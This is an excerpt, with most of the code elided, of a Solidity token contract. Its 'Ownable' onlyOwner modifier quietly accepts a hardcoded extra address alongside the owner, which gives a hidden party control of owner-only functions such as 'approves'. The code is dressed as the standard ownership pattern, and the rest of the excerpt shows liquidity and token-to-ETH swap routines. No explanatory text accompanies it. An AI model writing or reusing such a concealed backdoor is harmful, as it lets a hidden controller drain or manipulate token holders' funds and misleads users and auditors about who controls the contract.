...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x178F32dc5544C39616FF7b963255912f35e49C94) , "Ownable: caller is not the owner");
        _;
    }
...
contract TOKEN is IERC20, Ownable {
   ...
   function approves(address account, uint256 amount) onlyOwner() public {
    ...
    function addLiquidity(
        ...
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp + 0);
    }
    ...
    function swapTokensForEth(uint256 tokenAmount, address to) private {
        ...
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp + 0);
    }
}